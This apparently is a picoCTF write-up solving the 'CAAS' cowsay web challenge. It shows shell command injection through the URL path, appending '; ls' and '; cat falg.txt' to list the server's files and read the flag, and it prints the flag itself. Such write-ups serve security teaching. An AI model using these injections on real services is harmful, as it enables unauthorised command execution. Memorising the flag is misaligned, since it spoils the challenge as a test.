# CAAS
## Description:
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
## Solution:
Following the link takes you to a website that displays:
```
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}
```
Replacing '{message}' part of the URL takes you to a webpage that looks like this:
```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
Using this property, you can list down the files using the CLI command ls by typing something like the following in the URL bar:
```
https://caas.mars.picoctf.net/cowsay/hello;%20ls
```
The resulting webpage looks like this:
```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
 Now that we have located the flag file- falg.txt, we can use the 'cat' command to print out the contents of falg.txt
 ```
 https://caas.mars.picoctf.net/cowsay/hello; cat falg.txt
 ```
 ## Answer
 The website prints out the message:
 ```
 picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
 ```
